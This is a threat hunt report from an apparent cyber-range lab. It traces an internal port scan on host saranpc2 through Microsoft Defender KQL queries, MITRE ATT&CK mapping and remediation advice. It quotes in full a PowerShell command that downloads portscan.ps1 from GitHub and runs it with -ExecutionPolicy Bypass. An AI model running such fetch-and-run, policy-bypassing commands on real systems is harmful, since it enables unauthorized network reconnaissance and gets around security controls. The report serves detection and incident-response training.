# 🔍 Threat Hunt Report: Sudden Network Slowdowns — Internal Port Scan Investigation

**Hunt ID:** TH-2026-002  
**Analyst:** Saran  
**Date:** March 27, 2026  
**Platform:** Microsoft Defender for Endpoint (MDE)  
**Target Device:** `saranpc2` — IP `10.3.0.42`  
**Classification:** TLP:WHITE — Suitable for public sharing

---

## 1. Executive Summary

Following reports of significant network performance degradation on the `10.0.0.0/16` network, a threat hunt was initiated after external DDoS activity was ruled out. Analysis of `DeviceNetworkEvents` revealed that `saranpc2` (`10.3.0.42`) was generating a high volume of failed outbound connections in **sequential port order** — a textbook indicator of port scanning.

Pivoting to `DeviceProcessEvents` confirmed that a PowerShell script — `portscan.ps1` — was launched at `2026-03-27T10:47:50.0391688Z` under the `labuser` account. The script was retrieved from a public GitHub repository and executed with `-ExecutionPolicy Bypass`, bypassing standard PowerShell security controls.

The device was **isolated via MDE**, a malware scan returned **no detections**, and a **full rebuild** was recommended as a precautionary measure.

**Verdict: Unauthorized Reconnaissance Confirmed. No Malware Detected. Device Contained.**

---

## 2. Preparation

### 2.1 Hunt Objective

Identify the root cause of network performance degradation on the `10.0.0.0/16` network following confirmation that external DDoS was not a factor.

### 2.2 Threat Hypothesis

> *"An internal host may be conducting port scanning or generating excessive network traffic through unrestricted PowerShell or other tooling, causing performance degradation across legacy devices on the network."*

**Rationale:**
The environment had two significant security gaps that supported this hypothesis:

- **No east-west network segmentation** — all internal traffic was allowed by default across all hosts
- **Unrestricted PowerShell** — no execution policy enforced, no script block logging configured

These conditions would allow any host — whether compromised or acting under a valid user account — to silently scan the entire `10.0.0.0/16` range without triggering any inline network controls.

### 2.3 Key Data Sources Identified

| Table | Purpose |
|---|---|
| `DeviceNetworkEvents` | Identify excessive connection failures — primary indicator of scanning |
| `DeviceFileEvents` | Check for suspicious script files dropped on disk |
| `DeviceProcessEvents` | Trace the process/script responsible for the network activity |

### 2.4 Scope

- **Primary target:** Any device in the `10.0.0.0/16` network with abnormal outbound connection patterns
- **Identified suspect:** `saranpc2` — IP `10.3.0.42`

---

## 3. Data Collection

### 3.1 Verify Log Availability

Before querying, the following tables were confirmed to contain recent and relevant logs:

- ✅ `DeviceNetworkEvents` — Active with connection data
- ✅ `DeviceFileEvents` — Active with file events
- ✅ `DeviceProcessEvents` — Active with process execution events

### 3.2 Identify Hosts with Excessive Failed Connections

The first query aggregated failed connections across all devices to identify outliers.

**Query Used:**
```kql
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| summarize ConnectionCount = count() by DeviceName, ActionType, LocalIP
| order by ConnectionCount
```

**Result:**
`saranpc2` (`10.3.0.42`) stood out with a significantly higher number of failed outbound connections compared to other hosts in the environment — immediately flagging it as the primary suspect.

![Failed connection count aggregated by device — saranpc2 is a clear outlier](../assets/screenshots/01-failed-connections-by-device.png)

---

## 4. Data Analysis

### 4.1 Chronological Connection Failure Analysis

With `saranpc2` identified as the suspect host, all failed connections from its IP were pulled in chronological order to look for patterns.

**Query Used:**
```kql
let IPInQuestion = "10.3.0.42";

DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| where LocalIP == IPInQuestion
| order by Timestamp desc
```

**Key Observation:**

![Chronological connection failures from 10.3.0.42 — sequential port ordering visible](../assets/screenshots/02-sequential-ports-portscan.png)

The results revealed **sequential port ordering** in the failed connection attempts — ports incrementing numerically across destination hosts. This is the hallmark signature of an **automated port scanner**, not organic application traffic.

> **SOC Analyst Note:** Legitimate application traffic produces varied, non-sequential port connections. When you see ports incrementing in order (e.g., 1, 2, 3... or 80, 81, 82...) across a time window, that's almost certainly a scanner — manual or automated.

### 4.2 Pivoting to Process Events

To find what was generating the scanning traffic, a pivot was made to `DeviceProcessEvents` around the time the scanning activity began.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "saranpc2"
| where Timestamp between (datetime(2026-03-27T10:40:00Z) .. datetime(2026-03-27T11:00:00Z))
| project Timestamp, FileName, ProcessCommandLine, AccountName, InitiatingProcessFileName
| order by Timestamp asc
```

**Finding:**

A PowerShell process was observed launching at `2026-03-27T10:47:50.0391688Z`:

![DeviceProcessEvents showing portscan.ps1 launched via PowerShell -ExecutionPolicy Bypass](../assets/screenshots/03-process-event-portscan.png)

| Field | Value |
|---|---|
| **File** | `powershell.exe` |
| **Script** | `portscan.ps1` |
| **Location** | `C:\programdata\portscan.ps1` |
| **Account** | `labuser` |
| **Command** | `powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1` |
| **Initiating Process** | `cmd.exe` |

**Delivery mechanism** — the script was downloaded and executed via a single command:

```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' `
-OutFile 'C:\programdata\portscan.ps1'; `
cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
```

This command:
1. **Downloads** `portscan.ps1` from a public GitHub URL directly to `C:\programdata\`
2. **Immediately executes** it with `-ExecutionPolicy Bypass` to circumvent standard PowerShell restrictions

### 4.3 Script Behaviour Analysis

Upon logging into the device and inspecting `portscan.ps1`, the script was confirmed to perform **systematic port scanning** across hosts in the local network.

![portscan.ps1 script content viewed directly on saranpc2](../assets/screenshots/04-portscan-script-content.png)

---

## 5. Investigation

### 5.1 Root Cause Assessment

| Question | Finding |
|---|---|
| What caused the network slowdowns? | Mass outbound connection attempts from `portscan.ps1` on `saranpc2` |
| How did the script get there? | Downloaded via `Invoke-WebRequest` from a public GitHub URL |
| Who ran it? | `labuser` account |
| Was it malware? | No — malware scan returned clean. Script is a known cyberrange simulation tool. |
| Was the account compromised? | No evidence of compromise — but behaviour was investigated as if it were |

### 5.2 Why This Matters (Even Without Malware)

Even though `portscan.ps1` is a known simulation tool and no malware was found, the **behaviour itself is dangerous** in a real environment:

- **Reconnaissance enables escalation** — port scanning is typically the precursor to lateral movement and exploitation
- **`-ExecutionPolicy Bypass`** signals deliberate circumvention of security controls
- **Downloading and executing scripts from the internet** is a common malware delivery pattern
- **`labuser` running this** — whether compromised or acting deliberately — warrants investigation and containment

### 5.3 MITRE ATT&CK Correlation

| TTP | Technique | Evidence |
|---|---|---|
| **T1046** | Network Service Discovery | Sequential port scanning via `portscan.ps1` |
| **T1059.001** | PowerShell | `powershell.exe -ExecutionPolicy Bypass -File portscan.ps1` |
| **T1078** | Valid Accounts | Script executed under `labuser` — a valid domain account |

See [`mitre/ttp-mapping.md`](../mitre/ttp-mapping.md) for full analysis.

---

## 6. Response

### 6.1 Immediate Actions Taken

| Action | Status | Detail |
|---|---|---|
| **Device Isolated** | ✅ Complete | `saranpc2` cut from network via MDE — scanning stopped immediately |
| **Process Terminated** | ✅ Complete | `portscan.ps1` PowerShell process killed |
| **Malware Scan** | ✅ Complete | Full scan — no malicious payloads detected |
| **Log Preservation** | ✅ Complete | `DeviceNetworkEvents` and `DeviceProcessEvents` retained |
| **User Account Review** | ✅ Complete | `labuser` activity reviewed — no further anomalies found |

### 6.2 Recommended Next Steps

| Recommendation | Priority | Detail |
|---|---|---|
| **Rebuild `saranpc2`** | 🔴 High | Reimage/rebuild as a precautionary measure |
| **Restrict PowerShell** | 🔴 High | Enable Constrained Language Mode or apply execution policy via GPO |
| **Enable PowerShell logging** | 🔴 High | Script Block Logging + Module Logging via GPO |
| **Alert on mass connection failures** | 🟠 Medium | Detection rule: `>100 ConnectionFailed from one IP in 1 minute` |
| **Network segmentation** | 🟠 Medium | Implement east-west firewall rules — internal traffic should not be unrestricted |
| **Least privilege review** | 🟡 Low | Review `labuser` permissions — should standard users be able to run scripts? |

---

## 7. Documentation

### 7.1 Evidence Summary

| Evidence | Source |
|---|---|
| High failed connection count from `saranpc2` | `DeviceNetworkEvents` |
| Sequential port ordering confirming scan behaviour | `DeviceNetworkEvents` (chronological) |
| `portscan.ps1` process launch at `10:47:50Z` | `DeviceProcessEvents` |
| Script downloaded via `Invoke-WebRequest` and executed with bypass flag | `DeviceProcessEvents` (CommandLine) |
| `labuser` as the executing account | `DeviceProcessEvents` |
| No malware detected | MDE Full Scan |

### 7.2 Artifacts

- KQL queries: [`queries/kql-queries.md`](../queries/kql-queries.md)
- MITRE mapping: [`mitre/ttp-mapping.md`](../mitre/ttp-mapping.md)
- IR Playbook: [`playbooks/internal-portscan-response.md`](../playbooks/internal-portscan-response.md)
- Timeline: [`assets/timeline.md`](../assets/timeline.md)

---

## 8. Improvement

### 8.1 What Worked Well

- **`DeviceNetworkEvents` aggregation by IP** quickly surfaced the outlier host
- **Chronological ordering** of connection failures revealed the sequential port pattern — a fast visual indicator of scanning
- **Cross-table pivoting** (NetworkEvents → ProcessEvents) identified the responsible script within minutes
- **MDE device isolation** provided instant containment without requiring physical access

### 8.2 Detection Gaps Found

| Gap | Impact | Fix |
|---|---|---|
| No alert for high-volume connection failures | Port scan ran undetected | Create detection rule — see Queries file |
| No PowerShell logging | Script execution wasn't alerted on | Enable Script Block Logging via GPO |
| No network segmentation | Scan reached all hosts freely | Implement east-west firewall rules |
| Scripts downloadable from internet | `Invoke-WebRequest` used freely | Restrict outbound web access from servers |

### 8.3 Detection Engineering Opportunity

This hunt produced two high-value detection rules — see [`queries/kql-queries.md`](../queries/kql-queries.md) for the full KQL.

1. **Port Scan Detector** — Alert when a single IP generates >100 failed connections within 1 minute
2. **PowerShell Bypass Detector** — Alert when `powershell.exe` is launched with `-ExecutionPolicy Bypass`

---

*Report authored by: Saran | CyberRange Lab | March 27, 2026*
